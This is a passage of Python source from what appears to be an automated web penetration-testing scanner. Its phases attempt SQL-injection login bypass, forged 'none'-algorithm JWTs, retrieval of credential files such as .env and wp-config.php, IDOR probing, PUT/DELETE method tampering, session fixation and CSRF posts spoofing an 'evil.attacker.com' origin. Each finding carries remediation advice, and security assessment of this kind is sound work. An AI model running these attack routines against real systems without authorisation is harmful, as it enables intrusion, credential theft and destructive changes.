            data[user_f] = usr_pay
            data[pass_f] = pwd_pay
            try:
                r = sess.post(action, data=data, timeout=timeout, allow_redirects=True)
                if r.status_code in (200, 302) and not re.search(r'login|invalid|incorrect|failed', r.text, re.I):
                    with auth_out.open("a", encoding="utf-8") as _af:
                        _af.write(
                            f"## SQLi Login Bypass\n"
                            f"URL: {action}\nPayload: {usr_pay}\n"
                            f"Response: {r.status_code}\n{r.text[:2000]}\n\n"
                        )
                    out.add_finding(
                        title="Authentication Bypass via SQL Injection",
                        url=action, port=target["port"], risk="CRITICAL",
                        description=f"Login form at {action} is vulnerable to SQL injection authentication bypass.",
                        output=f"Payload: {usr_pay}\nResponse: {r.status_code}",
                        sources="fracture-auth-bypass", service=target["scheme"],
                        affected=action, output_file=str(auth_out),
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="IA-5",
                        remediation="Use parameterised queries for login. Implement account lockout.",
                    )
                    vc.log(f"[auth_bypass] Login SQLi bypass at {action}", "SUCCESS")
                    break
            except Exception:
                pass

    vc.status(phase, "Auth Bypass", "running", "Account enumeration", 2, 4)
    # 3. Account enumeration via password reset
    reset_paths = ["/forgot-password", "/reset-password", "/account/recover",
                   "/password-reset", "/auth/forgot"]
    for rpath in reset_paths:
        try:
            r = sess.get(url + rpath, timeout=timeout)
            if r.status_code == 200:
                # Check if responses differ for valid vs invalid users
                vc.log(f"[auth_bypass] Password reset endpoint found: {rpath}", "INFO")
                with auth_out.open("a", encoding="utf-8") as _af:
                    _af.write(
                        f"## Password Reset Endpoint\n"
                        f"Path: {rpath}\nResponse: {r.status_code}\n{r.text[:2000]}\n\n"
                    )
                out.add_finding(
                    title="Password Reset Endpoint Exposed",
                    url=url + rpath, port=target["port"], risk="INFO",
                    description=f"Password reset endpoint found at {rpath}. Test for account enumeration by submitting valid/invalid usernames.",
                    output=f"GET {rpath} → {r.status_code}",
                    sources="fracture-auth-bypass", service=target["scheme"],
                    affected=url + rpath, output_file=str(auth_out),
                    owasp="A07:2025 Identification and Authentication Failures",
                    nist="IA-5",
                    remediation="Ensure password reset returns a consistent message regardless of whether the email exists.",
                )
                break
        except Exception:
            pass

    vc.status(phase, "Auth Bypass", "running", "JWT none algorithm", 3, 4)
    # 4. JWT none algorithm check — look for JWT in cookies/headers
    for cookie in sess.cookies:
        val = cookie.value or ""
        if re.match(r'eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.', val):
            try:
                import base64 as _b64
                parts = val.split(".")
                padded = parts[0] + "=" * (-len(parts[0]) % 4)
                header = json.loads(_b64.urlsafe_b64decode(padded).decode("utf-8", errors="replace"))
                alg    = header.get("alg", "")
                if alg.lower() in ("hs256", "rs256"):
                    # Construct 'none' algorithm token
                    none_header = _b64.urlsafe_b64encode(
                        json.dumps({"alg": "none", "typ": "JWT"}).encode()
                    ).rstrip(b"=").decode()
                    none_token = f"{none_header}.{parts[1]}."
                    test_sess = _make_session(cfg)
                    test_sess.cookies.set(cookie.name, none_token)
                    r = test_sess.get(url, timeout=timeout)
                    if r.status_code == 200:
                        with auth_out.open("a", encoding="utf-8") as _af:
                            _af.write(
                                f"## JWT None Algorithm Bypass\n"
                                f"Cookie: {cookie.name}\nToken: {none_token[:80]}\n"
                                f"Response: {r.status_code}\n{r.text[:2000]}\n\n"
                            )
                        out.add_finding(
                            title="JWT None Algorithm Authentication Bypass",
                            url=url, port=target["port"], risk="CRITICAL",
                            description="The application accepted a JWT with 'none' algorithm, bypassing signature verification.",
                            output=f"Cookie: {cookie.name}\nToken: {none_token[:80]}",
                            sources="fracture-auth-bypass", service=target["scheme"],
                            output_file=str(auth_out),
                            owasp="A07:2025 Identification and Authentication Failures",
                            nist="IA-5",
                            remediation="Explicitly reject JWTs with 'none' algorithm. Require a strong signing algorithm.",
                        )
                        vc.log("[auth_bypass] JWT none algorithm accepted!", "SUCCESS")
            except Exception:
                pass

    vc.status(phase, "Auth Bypass", "complete", "Done", 4, 4)
    vc.log("[auth_bypass] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 8: Sensitive Files
# ─────────────────────────────────────────────
_SENSITIVE_FILES: list = [
    # (path, risk, description)
    # Risk levels calibrated to OWASP WSTG OTG-CONFIG-004 and Tenable/Acunetix guidance.
    # CWE-312 (Cleartext Storage), CWE-530 (Exposure of Backup File), CWE-200 (Info Disclosure).

    # CRITICAL — direct credential or source code exposure providing immediate data-layer access
    ("/.git/HEAD",              "CRITICAL", "Git repository HEAD file exposed — full source code reconstruction possible via git partial clone. CWE-312."),
    ("/.git/config",            "CRITICAL", "Git repository config exposed — may reveal remote URLs with embedded credentials. CWE-312."),
    ("/.git/COMMIT_EDITMSG",    "CRITICAL", "Git repository commit message exposed — confirms version control access. CWE-312."),
    ("/.env",                   "CRITICAL", ".env environment file exposed — contains database credentials, API keys, and secrets. CWE-312, CWE-522."),
    ("/.env.local",             "CRITICAL", ".env.local environment file exposed — contains environment-specific secrets. CWE-312, CWE-522."),
    ("/.env.production",        "CRITICAL", ".env.production environment file exposed — production secrets and credentials. CWE-312, CWE-522."),
    ("/wp-config.php",          "CRITICAL", "WordPress config file exposed — contains database credentials and AUTH_KEYs. CWE-312, CWE-522."),
    ("/settings.py",            "CRITICAL", "Django/Python settings file exposed — contains SECRET_KEY, database passwords, and API keys. CWE-312, CWE-522."),
    ("/database.yml",           "CRITICAL", "Rails database config exposed — contains production database host, username, and password. CWE-312, CWE-522."),
    ("/db.sql",                 "CRITICAL", "SQL database dump exposed — complete database contents including users, hashes, and PII. CWE-312, CWE-530."),
    ("/dump.sql",               "CRITICAL", "SQL database dump exposed — complete database contents including users, hashes, and PII. CWE-312, CWE-530."),
    ("/site.tar.gz",            "CRITICAL", "Site archive exposed — full application source code with embedded credentials. CWE-530, CWE-312."),
    ("/backup.zip",             "CRITICAL", "Backup archive exposed — application source code and config files with credentials. CWE-530, CWE-312."),
    # web.config: CRITICAL — machineKey exposure enables ASP.NET ViewState RCE; connection strings expose DB creds. CWE-13.
    ("/web.config",             "CRITICAL", "IIS web.config exposed — may contain database connection strings, machineKey (enables ViewState RCE), and API keys. CWE-13, CWE-312."),

    # HIGH — credential hash exposure or significant reconnaissance enabling further exploitation
    ("/config.php",             "HIGH",     "PHP config file exposed — likely contains database credentials. CWE-312."),
    ("/configuration.php",      "HIGH",     "PHP configuration file exposed — may contain database credentials. CWE-312."),
    ("/index.php.bak",          "HIGH",     "PHP source backup exposed — unprocessed source code visible. CWE-530."),
    ("/index.php~",             "HIGH",     "PHP editor backup exposed — unprocessed source code visible. CWE-530."),
    # .htpasswd: HIGH — contains HTTP Basic Auth hashes (MD5crypt readily crackable). CWE-522.
    ("/.htpasswd",              "HIGH",     ".htpasswd file exposed — contains HTTP Basic Auth password hashes, subject to offline cracking. CWE-522, CWE-200."),

    # MEDIUM — configuration reconnaissance or indirect attack enablement
    ("/.htaccess",              "MEDIUM",   ".htaccess file exposed — reveals access control rules and rewrite logic. CWE-200."),
    ("/phpinfo.php",            "MEDIUM",   "PHP info page exposed — discloses PHP version, loaded modules, server paths, and environment variables. CWE-200."),
    ("/info.php",               "MEDIUM",   "PHP info page exposed — discloses PHP version, loaded modules, server paths, and environment variables. CWE-200."),
    ("/test.php",               "MEDIUM",   "PHP test page exposed — may disclose configuration or provide unintended functionality. CWE-200."),
    ("/server-status",          "MEDIUM",   "Apache server-status exposed — discloses active requests, client IPs, and internal paths. CWE-200."),
    ("/server-info",            "MEDIUM",   "Apache server-info exposed — discloses module configuration and directives. CWE-200."),
    ("/docker-compose.yml",     "MEDIUM",   "docker-compose.yml exposed — discloses service topology, image versions, and potentially hardcoded credentials. CWE-200."),

    # LOW — dependency or infrastructure metadata with reconnaissance value only
    ("/composer.json",          "LOW",      "composer.json exposed — discloses PHP dependency versions for targeted CVE research. CWE-200."),
    ("/package.json",           "LOW",      "package.json exposed — discloses Node.js dependency versions for targeted CVE research. CWE-200."),
    ("/requirements.txt",       "LOW",      "requirements.txt exposed — discloses Python dependency versions for targeted CVE research. CWE-200."),
    ("/crossdomain.xml",        "LOW",      "crossdomain.xml exposed — Flash/PDF cross-domain policy may permit unintended access. CWE-942."),
    ("/clientaccesspolicy.xml", "LOW",      "clientaccesspolicy.xml exposed — Silverlight cross-domain policy file. CWE-200."),
    ("/.DS_Store",              "LOW",      ".DS_Store file exposed — macOS metadata reveals directory structure. CWE-200."),
    ("/Dockerfile",             "LOW",      "Dockerfile exposed — discloses base image, build steps, and environment configuration. CWE-200."),
]


def _phase_files(target: dict, cfg: dict, pm: ProgressManager,
                 out: OutputManager, sess: requests.Session) -> None:
    phase   = "files"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    total   = len(_SENSITIVE_FILES)
    vc.status(phase, "Sensitive Files", "running", "Probing", 0, total)

    # Detect wildcard/catch-all before probing; skip files that match the baseline.
    _file_wc = _detect_wildcard(url, sess, timeout)
    if _file_wc is not None:
        vc.log("[files] Wildcard detected — all file findings will be validated against baseline",
               "WARNING")

    for idx, (fpath, risk, fdesc) in enumerate(_SENSITIVE_FILES):
        vc.status(phase, "Sensitive Files", "running", fpath, idx, total)
        try:
            r = sess.get(url + fpath, timeout=timeout, allow_redirects=False)
            if r.status_code == 200 and len(r.text) > 5:
                if _is_wildcard_match(r, _file_wc):
                    continue   # matches catch-all baseline — not a real file
                out_f = out.output_path(phase, "file_" + fpath.replace("/", "_").lstrip("_"))
                out_f.write_text(r.text[:10000], encoding="utf-8")
                out.add_finding(
                    title=f"Sensitive File Exposed: {fpath}",
                    url=url + fpath, port=target["port"], risk=risk,
                    description=fdesc + f" ({url + fpath} returned HTTP 200).",
                    output=r.text[:500], sources="fracture-files",
                    service=target["scheme"], output_file=str(out_f),
                    affected=url + fpath,
                    owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                    remediation=f"Remove or restrict access to {fpath}.",
                )
                vc.log(f"[files] Found: {fpath} (risk={risk})", "SUCCESS")
        except Exception:
            pass

    vc.status(phase, "Sensitive Files", "complete", "Done", total, total)
    vc.log("[files] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 9: Vulnerability Scan
# ─────────────────────────────────────────────
_NUCLEI_SEVERITY_MAP = {"critical": "CRITICAL", "high": "HIGH",
                        "medium": "MEDIUM", "low": "LOW", "info": "INFO"}


def _phase_vulnscan(target: dict, cfg: dict, pm: ProgressManager,
                    out: OutputManager, sess: requests.Session,
                    fast: bool = False) -> None:
    phase   = "vulnscan"
    url     = target["url"]
    timeout = cfg.get("nuclei_timeout", 600)
    vc.status(phase, "Vuln Scan", "running", "nuclei", 0, 2)

    # 1. nuclei
    nuclei = _find_tool("nuclei")
    if nuclei and not fast:
        nuc_out = out.output_path(phase, "nuclei_" + target["hostname"])
        _nuc_templates_dir = "/opt/nuclei-templates"
        cmd = [nuclei, "-u", url, "-s", "critical,high,medium",
               "-silent", "-jsonl", "-no-interactsh", "-o", str(nuc_out)]
        if Path(_nuc_templates_dir).is_dir():
            cmd += ["-t", _nuc_templates_dir]
        vc.log("[vulnscan] Running nuclei ...", "INFO")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            proc.communicate(timeout=timeout)
            _deregister_proc(proc)
            out.log_command("nuclei", cmd, nuc_out)
            if nuc_out.exists():
                for line in nuc_out.read_text(encoding="utf-8").splitlines():
                    try:
                        item    = json.loads(line)
                        sev     = _NUCLEI_SEVERITY_MAP.get(item.get("info", {}).get("severity", "info"), "INFO")
                        ntitle  = item.get("info", {}).get("name", "Nuclei Finding")
                        matched = item.get("matched-at", url)
                        desc    = item.get("info", {}).get("description", "")
                        cves    = ",".join(item.get("info", {}).get("classification", {}).get("cve-id", []))
                        out.add_finding(
                            title=f"Nuclei: {ntitle}",
                            url=matched, port=target["port"], risk=sev,
                            description=desc, sources="nuclei",
                            service=target["scheme"], output_file=str(nuc_out),
                            cves=cves, affected=matched,
                            owasp="A06:2025 Vulnerable and Outdated Components",
                            nist="SI-2",
                            remediation="Apply vendor patches and update affected components.",
                        )
                    except Exception:
                        pass
        except Exception as e:
            out.log_error("nuclei", cmd, str(e))
    else:
        vc.log("[vulnscan] nuclei not found or fast mode — skipping", "WARNING")

    vc.status(phase, "Vuln Scan", "running", "nikto", 1, 2)
    # 2. nikto
    nikto = _find_tool("nikto")
    if nikto:
        nik_out = out.output_path(phase, "nikto_" + target["hostname"])
        cmd     = [nikto, "-h", url, "-Format", "json",
                   "-output", str(nik_out), "-nointeractive"]
        vc.log("[vulnscan] Running nikto ...", "INFO")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            proc.communicate(timeout=600)
            _deregister_proc(proc)
            out.log_command("nikto", cmd, nik_out)
            if nik_out.exists():
                try:
                    ndata = json.loads(nik_out.read_text(encoding="utf-8"))
                    for vuln in ndata.get("vulnerabilities", []):
                        out.add_finding(
                            title=f"Nikto: {vuln.get('id','Unknown')}",
                            url=url, port=target["port"], risk="MEDIUM",
                            description=vuln.get("msg", ""),
                            sources="nikto", service=target["scheme"],
                            output_file=str(nik_out),
                            owasp="A06:2025 Vulnerable and Outdated Components",
                            nist="SI-2",
                            remediation="Review and remediate the identified web server issue.",
                        )
                except Exception:
                    pass
        except Exception as e:
            out.log_error("nikto", cmd, str(e))
    else:
        vc.log("[vulnscan] nikto not found", "WARNING")

    vc.status(phase, "Vuln Scan", "complete", "Done", 2, 2)
    vc.log("[vulnscan] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 10: GraphQL
# ─────────────────────────────────────────────
_GRAPHQL_PATHS = ["/graphql", "/api/graphql", "/graphql/v1",
                  "/query", "/gql", "/v1/graphql"]
_INTROSPECTION_QUERY = '{"query":"{__schema{types{name}}}"}'


def _phase_graphql(target: dict, cfg: dict, pm: ProgressManager,
                   out: OutputManager, sess: requests.Session) -> None:
    phase   = "graphql"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    vc.status(phase, "GraphQL", "running", "Endpoint detection", 0, 3)

    found_gql = None
    for gpath in _GRAPHQL_PATHS:
        try:
            r = sess.post(url + gpath,
                          data=_INTROSPECTION_QUERY,
                          headers={"Content-Type": "application/json"},
                          timeout=timeout)
            if r.status_code == 200 and "__schema" in r.text:
                found_gql = url + gpath
                vc.log(f"[graphql] GraphQL endpoint: {found_gql}", "SUCCESS")
                out.add_finding(
                    title="GraphQL Introspection Enabled",
                    url=found_gql, port=target["port"], risk="MEDIUM",
                    description=f"GraphQL introspection is enabled at {found_gql}. This allows attackers to enumerate the full API schema.",
                    output=r.text[:500], sources="fracture-graphql",
                    service=target["scheme"], affected=found_gql,
                    owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                    remediation="Disable GraphQL introspection in production environments.",
                )
                break
            elif r.status_code == 200 and "data" in r.text:
                found_gql = url + gpath
                vc.log(f"[graphql] GraphQL endpoint (no introspection): {found_gql}", "INFO")
                break
        except Exception:
            pass

    if not found_gql:
        vc.log("[graphql] No GraphQL endpoint found", "INFO")
        vc.status(phase, "GraphQL", "complete", "No endpoint", 3, 3)
        return

    vc.status(phase, "GraphQL", "running", "Batch query test", 1, 3)
    # Test batch query attack
    batch_query = '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]'
    try:
        r = sess.post(found_gql, data=batch_query,
                      headers={"Content-Type": "application/json"}, timeout=timeout)
        if r.status_code == 200 and isinstance(json.loads(r.text), list):
            out.add_finding(
                title="GraphQL Batch Query Attack Possible",
                url=found_gql, port=target["port"], risk="MEDIUM",
                description="GraphQL accepts batched queries, which can be used to bypass rate limiting.",
                output=r.text[:300], sources="fracture-graphql",
                service=target["scheme"], affected=found_gql,
                owasp="A05:2025 Security Misconfiguration", nist="SC-5",
                remediation="Implement query complexity limits and disable batching if not required.",
            )
    except Exception:
        pass

    vc.status(phase, "GraphQL", "running", "Field suggestions", 2, 3)
    # Field suggestion detection
    try:
        r = sess.post(found_gql,
                      data='{"query":"{doesNotExist}"}',
                      headers={"Content-Type": "application/json"}, timeout=timeout)
        if "Did you mean" in r.text or "suggestion" in r.text.lower():
            out.add_finding(
                title="GraphQL Field Suggestions Enabled",
                url=found_gql, port=target["port"], risk="LOW",
                description="GraphQL returns field name suggestions on typos, which can aid schema enumeration.",
                output=r.text[:300], sources="fracture-graphql",
                service=target["scheme"], affected=found_gql,
                owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                remediation="Disable field suggestions in production.",
            )
    except Exception:
        pass

    vc.status(phase, "GraphQL", "complete", "Done", 3, 3)
    vc.log("[graphql] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 11: Auth Recon
# ─────────────────────────────────────────────
def _phase_auth_recon(target: dict, cfg: dict, pm: ProgressManager,
                      out: OutputManager, auth_sess: requests.Session,
                      crawl_data: dict) -> dict:
    phase   = "auth_recon"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    vc.status(phase, "Auth Recon", "running", "Crawling authenticated", 0, 3)

    # Crawl with authenticated session
    auth_crawl = _phase_crawl.__wrapped__ if hasattr(_phase_crawl, "__wrapped__") else None
    # Re-crawl with auth session
    visited:    set  = set()
    queue_urls: list = [(url, 0)]
    auth_forms: list = []
    auth_links: list = []
    page_count        = 0
    max_pages = cfg.get("crawl_max_pages", 150)
    max_depth = cfg.get("crawl_depth", 3)

    while queue_urls and page_count < max_pages:
        current_url, depth = queue_urls.pop(0)
        _norm_cur = current_url.rstrip("/")
        if _norm_cur in visited:
            continue
        visited.add(_norm_cur)
        page_count += 1
        data = _crawl_page(current_url, auth_sess, timeout, url)
        if data["error"]:
            continue
        auth_forms.extend(data["forms"])
        auth_links.extend(data["links"])
        if depth < max_depth:
            for link in data["links"]:
                if link.rstrip("/") not in visited and _same_origin(url, link):
                    queue_urls.append((link, depth + 1))

    vc.log(f"[auth_recon] Authenticated crawl: {page_count} pages", "INFO")
    vc.status(phase, "Auth Recon", "running", "Interesting endpoints", 1, 3)

    # Find admin-only endpoints
    for link in set(auth_links):
        if _INTERESTING_PATH_RE.search(link):
            out.add_finding(
                title="Authenticated Interesting Endpoint",
                url=link, port=target["port"], risk="INFO",
                description=f"Interesting endpoint accessible while authenticated: {link}",
                sources="fracture-auth-recon", service=target["scheme"],
                affected=link,
                owasp="A01:2025 Broken Access Control", nist="AC-3",
                remediation="Verify this endpoint enforces proper authorisation.",
            )

    vc.status(phase, "Auth Recon", "running", "User ID extraction", 2, 3)
    # Look for numeric/UUID IDs in links
    _id_re = re.compile(r'/(\d+)(?:/|$|[?#])')
    resource_ids: list = []
    for link in set(auth_links):
        for m in _id_re.finditer(link):
            resource_ids.append({"url": link, "id": int(m.group(1))})

    vc.status(phase, "Auth Recon", "complete", "Done", 3, 3)
    vc.log("[auth_recon] Phase complete", "SUCCESS")
    return {"forms": auth_forms, "links": list(set(auth_links)), "resource_ids": resource_ids}


# ─────────────────────────────────────────────
# Phase 12: Authorization (IDOR)
# ─────────────────────────────────────────────
def _phase_authorization(target: dict, cfg: dict, pm: ProgressManager,
                          out: OutputManager, auth_sess: requests.Session,
                          auth_recon_data: dict) -> None:
    phase   = "authorization"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    resource_ids = auth_recon_data.get("resource_ids", [])
    vc.status(phase, "Authorization Testing", "running", "IDOR testing", 0, len(resource_ids))

    for idx, res in enumerate(resource_ids[:50]):
        res_url = res["url"]
        res_id  = res["id"]
        vc.status(phase, "Authorization Testing", "running", f"ID {res_id}", idx, len(resource_ids))

        # Test adjacent IDs
        for test_id in [res_id - 1, res_id + 1, res_id + 100]:
            if test_id <= 0:
                continue
            test_url = re.sub(r'/' + str(res_id) + r'(?=/|$|[?#])',
                               '/' + str(test_id), res_url, count=1)
            try:
                r = auth_sess.get(test_url, timeout=timeout)
                if r.status_code == 200 and len(r.text) > 100:
                    out.add_finding(
                        title="Insecure Direct Object Reference (IDOR)",
                        url=test_url, port=target["port"], risk="HIGH",
                        description=f"IDOR detected: resource ID {res_id} → {test_id} returned HTTP 200. Another user's data may be accessible.",
                        output=f"Original: {res_url}\nManipulated: {test_url}\nStatus: {r.status_code}",
                        sources="fracture-authorization", service=target["scheme"],
                        affected=test_url,
                        owasp="A01:2025 Broken Access Control", nist="AC-3",
                        remediation="Implement object-level authorisation. Verify the requesting user owns each resource.",
                    )
                    vc.log(f"[authorization] IDOR: {test_url}", "SUCCESS")
                    break
            except Exception:
                pass

    vc.status(phase, "Authorization Testing", "running", "HTTP method tampering", len(resource_ids), len(resource_ids))
    # Method tampering
    auth_links = auth_recon_data.get("links", [])
    for link in auth_links[:20]:
        for method in ("PUT", "DELETE", "PATCH"):
            try:
                r = auth_sess.request(method, link, timeout=timeout)
                if r.status_code not in (405, 404, 400, 401, 403, 501):
                    out.add_finding(
                        title=f"HTTP Method Tampering: {method} Accepted",
                        url=link, port=target["port"], risk="MEDIUM",
                        description=f"The endpoint {link} accepted HTTP {method} (status {r.status_code}).",
                        output=f"{method} {link} → {r.status_code}",
                        sources="fracture-authorization", service=target["scheme"],
                        affected=link,
                        owasp="A01:2025 Broken Access Control", nist="AC-3",
                        remediation="Restrict HTTP methods to only those required for each endpoint.",
                    )
                    vc.log(f"[authorization] Method tampering {method} on {link}", "SUCCESS")
            except Exception:
                pass

    vc.status(phase, "Authorization Testing", "complete", "Done", len(resource_ids), len(resource_ids))
    vc.log("[authorization] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 13: Session
# ─────────────────────────────────────────────
def _phase_session(target: dict, cfg: dict, pm: ProgressManager,
                   out: OutputManager, auth_sess: requests.Session) -> None:
    phase   = "session"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    vc.status(phase, "Session Analysis", "running", "Token entropy", 0, 4)

    # 1. Analyse session token entropy
    for cookie in auth_sess.cookies:
        val = cookie.value or ""
        if len(val) < 8:
            continue
        # Check for low-entropy tokens
        unique_chars = len(set(val))
        if unique_chars < 8 and len(val) < 20:
            out.add_finding(
                title="Low-Entropy Session Token",
                url=url, port=target["port"], risk="HIGH",
                description=f"Session cookie '{cookie.name}' has low entropy (value length={len(val)}, unique chars={unique_chars}).",
                output=f"Cookie: {cookie.name}={val[:20]}...",
                sources="fracture-session", service=target["scheme"],
                owasp="A07:2025 Identification and Authentication Failures",
                nist="IA-5",
                remediation="Use cryptographically secure random session token generators (e.g. 128-bit+).",
            )

        # Check for sequential/predictable tokens
        if val.isdigit():
            out.add_finding(
                title="Potentially Predictable Session Token",
                url=url, port=target["port"], risk="HIGH",
                description=f"Session cookie '{cookie.name}' consists entirely of digits, which may indicate a sequential or predictable value.",
                output=f"Cookie: {cookie.name}={val[:20]}",
                sources="fracture-session", service=target["scheme"],
                owasp="A07:2025 Identification and Authentication Failures",
                nist="IA-5",
                remediation="Use cryptographically secure random session identifiers.",
            )

    vc.status(phase, "Session Analysis", "running", "Session fixation", 1, 4)
    # 2. Session fixation — check if server accepts user-provided session ID
    fixed_id = "fracture_fixed_session_12345678"
    try:
        test_sess = _make_session(cfg)
        # Find a session cookie name
        session_cookie_name = None
        for cookie in auth_sess.cookies:
            if re.search(r'sess|token|auth|sid', cookie.name, re.I):
                session_cookie_name = cookie.name
                break
        if session_cookie_name:
            test_sess.cookies.set(session_cookie_name, fixed_id)
            r = test_sess.get(url, timeout=timeout)
            returned_val = test_sess.cookies.get(session_cookie_name, "")
            if returned_val == fixed_id:
                out.add_finding(
                    title="Session Fixation Vulnerability",
                    url=url, port=target["port"], risk="HIGH",
                    description=f"The server accepted and returned the user-provided session ID '{fixed_id}', indicating session fixation vulnerability.",
                    output=f"Set cookie: {session_cookie_name}={fixed_id}\nReturned: {returned_val}",
                    sources="fracture-session", service=target["scheme"],
                    owasp="A07:2025 Identification and Authentication Failures",
                    nist="IA-5",
                    remediation="Regenerate session IDs upon authentication. Reject externally provided session IDs.",
                )
                vc.log("[session] Session fixation confirmed", "SUCCESS")
    except Exception:
        pass

    vc.status(phase, "Session Analysis", "running", "Logout invalidation", 2, 4)
    # 3. Check logout invalidation
    logout_paths = ["/logout", "/signout", "/auth/logout", "/session/destroy", "/api/logout"]
    for lpath in logout_paths:
        try:
            # Save session cookies before logout
            pre_cookies = dict(auth_sess.cookies)
            r = auth_sess.get(url + lpath, timeout=timeout)
            if r.status_code in (200, 302):
                # Try to use old session
                old_sess = _make_session(cfg)
                for k, v in pre_cookies.items():
                    old_sess.cookies.set(k, v)
                r2 = old_sess.get(url, timeout=timeout)
                if r2.status_code == 200 and not re.search(r'login|sign.?in|auth', r2.url, re.I):
                    out.add_finding(
                        title="Session Not Invalidated After Logout",
                        url=url + lpath, port=target["port"], risk="HIGH",
                        description="Session cookies remain valid after logout. Old sessions can be reused.",
                        output=f"Logout: {url + lpath}\nOld session still valid: {r2.url}",
                        sources="fracture-session", service=target["scheme"],
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="SC-23",
                        remediation="Invalidate session server-side on logout. Do not rely solely on client-side cookie deletion.",
                    )
                    vc.log("[session] Session not invalidated after logout", "SUCCESS")
            break
        except Exception:
            pass

    vc.status(phase, "Session Analysis", "complete", "Done", 4, 4)
    vc.log("[session] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 14: CSRF
# ─────────────────────────────────────────────
def _phase_csrf(target: dict, cfg: dict, pm: ProgressManager,
                out: OutputManager, auth_sess: requests.Session,
                auth_recon_data: dict) -> None:
    phase   = "csrf"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = auth_recon_data.get("forms", [])
    vc.status(phase, "CSRF Testing", "running", "Form analysis", 0, len(forms))

    for idx, form in enumerate(forms[:30]):
        action = form.get("action", url)
        method = form.get("method", "GET")
        inputs = form.get("inputs", [])
        vc.status(phase, "CSRF Testing", "running", f"Form {idx}", idx, len(forms))

        if method != "POST":
            continue

        # Check for CSRF token fields
        csrf_fields = [i["name"] for i in inputs
                       if re.search(r'csrf|token|nonce|_token|authenticity', i["name"], re.I)]
        samesite_protected = False
        for cookie in auth_sess.cookies:
            # SameSite is difficult to check without raw header — just note presence
            pass

        if not csrf_fields:
            # No CSRF token — attempt a cross-origin POST
            data = {i["name"]: "fracture_csrf_test" for i in inputs if i.get("name")}
            try:
                test_sess = _make_session(cfg)  # unauthenticated cross-origin session
                # Copy auth cookies to simulate credential forwarding
                for cookie in auth_sess.cookies:
                    test_sess.cookies.set(cookie.name, cookie.value)
                r = test_sess.post(
                    action, data=data, timeout=timeout,
                    headers={"Origin": "https://evil.attacker.com",
                             "Referer": "https://evil.attacker.com/"}
                )
                if r.status_code in (200, 302):
                    out.add_finding(
                        title="Cross-Site Request Forgery (CSRF) — Missing Token",
                        url=action, port=target["port"], risk="HIGH",
                        description=f"State-changing form at {action} lacks a CSRF token. A cross-origin POST was accepted.",
                        output=f"Form action: {action}\nInputs: {[i['name'] for i in inputs]}",
                        sources="fracture-csrf", service=target["scheme"],
                        affected=action,
                        owasp="A04:2025 Insecure Design", nist="SI-10",
                        remediation="Implement synchronised CSRF tokens on all state-changing forms. Use SameSite=Lax/Strict cookies.",
                    )
                    vc.log(f"[csrf] CSRF: no token at {action}", "SUCCESS")
            except Exception:
                pass

    vc.status(phase, "CSRF Testing", "complete", "Done", len(forms), len(forms))
    vc.log("[csrf] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 15: Cross-User (requires auth2)
# ─────────────────────────────────────────────
def _phase_cross_user(target: dict, cfg: dict, pm: ProgressManager,
                      out: OutputManager,
                      auth_sess: requests.Session,
                      auth2_sess: requests.Session,
                      auth_recon_data: dict) -> None:
    phase    = "cross_user"
    url      = target["url"]
    timeout  = cfg.get("timeout", 10)
    resource_ids = auth_recon_data.get("resource_ids", [])
    links        = auth_recon_data.get("links", [])
    vc.status(phase, "Cross-User Testing", "running", "Resource enumeration", 0, len(resource_ids))

    for idx, res in enumerate(resource_ids[:50]):
        res_url = res["url"]
        vc.status(phase, "Cross-User Testing", "running", f"Resource {res['id']}", idx, len(resource_ids))
        try:
            # Access user1's resource as user2
            r = auth2_sess.get(res_url, timeout=timeout)
            if r.status_code == 200 and len(r.text) > 100:
                out.add_finding(
                    title="Cross-User Data Leakage (IDOR)",
                    url=res_url, port=target["port"], risk="CRITICAL",
                    description=f"User2 can access User1's resource at {res_url} (HTTP 200). This is a confirmed cross-user authorisation bypass.",
                    output=f"Resource: {res_url}\nUser2 response: {r.status_code} ({len(r.text)} bytes)",
                    sources="fracture-cross-user", service=target["scheme"],
                    affected=res_url,
                    owasp="A01:2025 Broken Access Control", nist="AC-3",
                    remediation="Implement and enforce object-level authorisation checks. Verify ownership for every resource access.",
                )
                vc.log(f"[cross_user] Cross-user leakage: {res_url}", "SUCCESS")
        except Exception:
            pass

    vc.status(phase, "Cross-User Testing", "running", "API endpoint testing", len(resource_ids), len(resource_ids))
    # Test authenticated API endpoints
    for link in links[:30]:
        if re.search(r'/api/', link, re.I):
            try:
                r1 = auth_sess.get(link, timeout=timeout)
                r2 = auth2_sess.get(link, timeout=timeout)
                if r1.status_code == 200 and r2.status_code == 200:
                    # If both users see the same data, check for user-specific content
                    if r1.text == r2.text and len(r1.text) > 50:
                        out.add_finding(
                            title="API Endpoint Returns Same Data for All Users",
                            url=link, port=target["port"], risk="MEDIUM",
                            description=f"API endpoint {link} returns identical data for different authenticated users — may indicate missing user-scope filtering.",
                            output=f"User1 == User2 response ({len(r1.text)} bytes)",
                            sources="fracture-cross-user", service=target["scheme"],
                            affected=link,
                            owasp="A01:2025 Broken Access Control", nist="AC-3",
                            remediation="Scope API responses to the authenticated user. Do not return data for all users.",
                        )
            except Exception:
                pass

